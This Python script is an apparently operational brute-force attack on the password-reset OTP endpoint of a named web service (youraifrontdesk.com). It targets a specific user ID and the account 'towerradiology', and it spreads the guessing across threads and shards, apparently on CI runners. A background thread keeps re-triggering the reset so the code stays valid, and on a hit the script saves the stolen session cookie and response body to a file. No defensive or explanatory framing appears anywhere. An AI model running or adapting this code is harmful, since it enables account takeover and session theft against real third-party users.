import os, threading, time
import requests

URL = 'https://youraifrontdesk.com/api/auth/verify-reset-otp'
UID = os.environ['UID']; START = int(os.environ['START']); END = int(os.environ['END'])
W = int(os.environ.get('WORKERS', '12'))
SHARD = int(os.environ.get('SHARD', '0')); NSH = int(os.environ.get('NSHARDS', '1'))
STOP = threading.Event(); L = threading.Lock(); S = {'tried': 0, 'err': 0}
first = START + ((SHARD - START) % NSH)
CODES = range(first, END + 1, NSH)


def w(k):
    s = requests.Session()
    for c in CODES[k::W]:
        if STOP.is_set():
            return
        try:
            r = s.post(URL, json={'user_id': UID, 'otp_code': f'{c:06d}'}, timeout=20)
        except Exception as e:
            with L:
                S['err'] += 1
                if S['err'] <= 3:
                    print('ERR', type(e).__name__, str(e)[:120], flush=True)
            continue
        with L:
            S['tried'] += 1
            n = S['tried']
        if r.status_code == 200:
            STOP.set()
            open('HIT.txt', 'w').write(f'otp={c:06d}\ncookie={r.headers.get("set-cookie")}\nbody={r.text}\n')
            print('::notice title=HIT::otp ' + f'{c:06d}', flush=True)
            return
        if n % 5000 == 0:
            print('tried', n, 'at', c, 'err', S['err'], flush=True)


def refresh():
    while not STOP.wait(240):
        try:
            r = requests.post('https://youraifrontdesk.com/api/auth/reset-password',
                              json={'username_or_Email': 'towerradiology'}, timeout=20)
            print('refresh', r.status_code, flush=True)
        except Exception as e:
            print('refresh err', type(e).__name__, flush=True)


print('start', START, END, W, 'shard', SHARD, '/', NSH, flush=True)
threading.Thread(target=refresh, daemon=True).start()
ts = [threading.Thread(target=w, args=(k,), daemon=True) for k in range(W)]
[t.start() for t in ts]
while any(t.is_alive() for t in ts) and not STOP.is_set():
    time.sleep(2)
print('done tried', S['tried'], 'err', S['err'], flush=True)
